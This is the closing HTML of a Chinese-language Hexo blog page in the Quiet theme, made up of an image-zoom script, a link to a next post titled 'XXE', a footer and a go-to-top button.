    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #fffff0;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
</script>
<div class="Last-Next">
    

    
    <a href="/2021/07/20/2021-7-21-XXE%E5%AD%A6%E4%B9%A0/">
        <div class="next">
            <span>下一篇</span>
            <p>XXE</p>
        </div>
    </a>
    
</div>
		
<link rel="stylesheet" href="/css/food.css">

<div class="footer">
	<div class="Copyright">
		©2021 By KKfine. 主题：<a
			style="text-decoration: none;display: contents; color: #898F9F;"
			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
	</div>
	<div class="contact">
		
		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
		</a>
		
	</div>
</div>

<script src="/js/jquery.min.js"></script>


<script src="/js/gotop.js"></script>


<style type="text/css">
    @media screen and (min-width: 600px) {
        .goTop>span {
            display: block;
            border-radius: 50%;
            width: 66px;
            height: 66px;
            cursor: pointer;
            opacity: 0.8;
            background: rgba(18, 24, 58, 0.06);
            text-align: center;
            border: 1px solid rgba(18, 24, 58, 0.06);

            transition: border .5s;
            -moz-transition: border .5s;
            /* Firefox 4 */
            -webkit-transition: border .5s;
            /* Safari 和 Chrome */
            -o-transition: border .5s;
            /* Opera */
        }

        .goTop>span:hover {
            border: 1px solid #6680B3;
        }


        .goTop {
            position: fixed;
            right: 30px;
            bottom: 80px;
        }

        .goTop>span>svg {
            width: 30px;
            height: 30px;
            margin-top: 17.5px;
            opacity: 0.7;
        }

    }

    @media screen and (max-width: 600px) {
        .goTop {
            display: none;
        }
    }
</style>
<div class="goTop" id="js-go_top">
    <span>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
            <g>
                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
            </g>
        </svg>
    </span>
</div>
<script>
    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
</script>
<script>
	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
</script>
	</body>

</html>